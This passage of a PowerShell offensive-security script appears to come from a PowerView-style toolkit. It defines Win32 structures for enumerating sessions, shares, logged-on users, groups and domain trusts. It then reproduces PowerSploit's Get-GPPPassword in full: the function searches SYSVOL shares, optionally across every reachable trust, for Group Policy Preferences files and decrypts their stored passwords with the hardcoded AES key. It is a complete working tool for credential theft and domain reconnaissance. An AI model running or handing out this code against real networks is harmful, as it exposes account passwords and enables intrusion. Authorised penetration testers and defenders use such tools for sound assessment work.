    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# enum used by $WTS_SESSION_INFO_1 below
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# enum used by $LOCALGROUP_MEMBERS_INFO_2 below
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# the NetLocalGroupEnum result structure
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

# the NetLocalGroupGetMembers result structure
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

# enums used in DS_DOMAIN_TRUSTS
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# the DsEnumerateDomainTrusts result structure
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# used by WNetAddConnection2W
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']


##########
#                                                                                        
#   THIS IS CODE TAKEN DIRECTLY FROM POWERSPLOIT'S Get-GPPPassword
#   https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
#   Author: Chris Campbell (@obscuresec))
#                                                                                        
##########

function Get-GPPPassword {
<#
.SYNOPSIS

Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

PowerSploit Function: Get-GPPPassword  
Author: Chris Campbell (@obscuresec)  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None  

.DESCRIPTION

Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.PARAMETER Server

Specify the domain controller to search for.
Default's to the users current domain

.PARAMETER SearchForest

Map all reaschable trusts and search all reachable SYSVOLs.

.EXAMPLE

Get-GPPPassword

NewName   : [BLANK]
Changed   : {2014-02-21 05:28:53}
Passwords : {password12}
UserNames : {test1}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml

NewName   : {mspresenters}
Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
Passwords : {Recycling*3ftw!, password123, password1234}
UserNames : {Administrator (built-in), DummyAccount, dummy2}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

NewName   : [BLANK]
Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
Passwords : {password, password1234$}
UserNames : {administrator, admin}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml

NewName   : [BLANK]
Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
Passwords : {password, read123}
UserNames : {DEMO\Administrator, admin}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml

.EXAMPLE

Get-GPPPassword -Server EXAMPLE.COM

NewName   : [BLANK]
Changed   : {2014-02-21 05:28:53}
Passwords : {password12}
UserNames : {test1}
File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml

NewName   : {mspresenters}
Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
Passwords : {Recycling*3ftw!, password123, password1234}
UserNames : {Administrator (built-in), DummyAccount, dummy2}
File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml

.EXAMPLE

Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq

password
password12
password123
password1234
password1234$
read123
Recycling*3ftw!

.LINK

http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SearchForest
    )

    # define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword
        )

        try {
            #Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            # Make sure System.Core is loaded
            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null

            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch { Write-Error $Error[0] }
    }

    # helper function to parse fields from xml files
    function Get-GPPInnerField {
    [CmdletBinding()]
        Param (
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            # check for the cpassword field
            if ($Xml.innerxml -match 'cpassword') {

                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                           $Password = $DecryptedPassword
                           Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
                        }

                        if ($_.newName) {
                            $NewName = $_.newName
                        }

                        if ($_.userName) {
                            $UserName = $_.userName
                        }
                        elseif ($_.accountName) {
                            $UserName = $_.accountName
                        }
                        elseif ($_.runAs) {
                            $UserName = $_.runAs
                        }

                        try {
                            $Changed = $_.ParentNode.changed
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
                        }

                        try {
                            $NodeName = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                        }

                        if (!($Password)) {$Password = '[BLANK]'}
                        if (!($UserName)) {$UserName = '[BLANK]'}
                        if (!($Changed)) {$Changed = '[BLANK]'}
                        if (!($NewName)) {$NewName = '[BLANK]'}

                        $GPPPassword = New-Object PSObject
                        $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
                        $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
                        $GPPPassword | Add-Member Noteproperty 'Password' $Password
                        $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
                        $GPPPassword | Add-Member Noteproperty 'File' $File
                        $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
                        $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
                        $GPPPassword
                    }
                }
            }
        }
        catch {
            Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
        }
    }

    # helper function (adapted from PowerView) to enumerate the domain/forest trusts for a specified domain
    function Get-DomainTrust {
        [CmdletBinding()]
        Param (
            $Domain
        )

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                if ($DomainObject) {
                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
            }

            try {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                if ($ForestObject) {
                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
            }
        }
    }

    # helper function (adapted from PowerView) to enumerate all reachable trusts from the current domain
    function Get-DomainTrustMapping {
        [CmdletBinding()]
        Param ()

        # keep track of domains seen so we don't hit infinite recursion
        $SeenDomains = @{}

        # our domain stack tracker
        $Domains = New-Object System.Collections.Stack

        try {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            $CurrentDomain
        }
        catch {
            Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
        }

        if ($CurrentDomain -and $CurrentDomain -ne '') {
            $Domains.Push($CurrentDomain)

            while($Domains.Count -ne 0) {

                $Domain = $Domains.Pop()

                # if we haven't seen this domain before
                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

                    Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

                    # mark it as seen in our list
                    $Null = $SeenDomains.Add($Domain, '')

                    try {
                        # get all the domain/forest trusts for this domain
                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                            # only output if we haven't already seen this domain and if it's pingable
                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = $Domains.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-DomainTrustMapping] Error: $_"
                    }
                }
            }
        }
    }

    try {
        $XMLFiles = @()
        $Domains = @()

        $AllUsers = $Env:ALLUSERSPROFILE
        if (-not $AllUsers) {
            $AllUsers = 'C:\ProgramData'
        }

        # discover any locally cached GPP .xml files
        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ($SearchForest) {
            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
            $Domains += Get-DomainTrustMapping
        }
        else {
            if ($Server) {
                $Domains += , $Server
            }
            else {
                # in case we're in a SYSTEM context
                $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            }
        }

        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique

        ForEach ($Domain in $Domains) {
            # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
            $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

            if($DomainXMLFiles) {
                $XMLFiles += $DomainXMLFiles
            }
        }

        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }

        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

        ForEach ($File in $XMLFiles) {
            $Result = (Get-GppInnerField $File.Fullname)
            $Result
        }
    }

    catch { Write-Error $Error[0] }
}
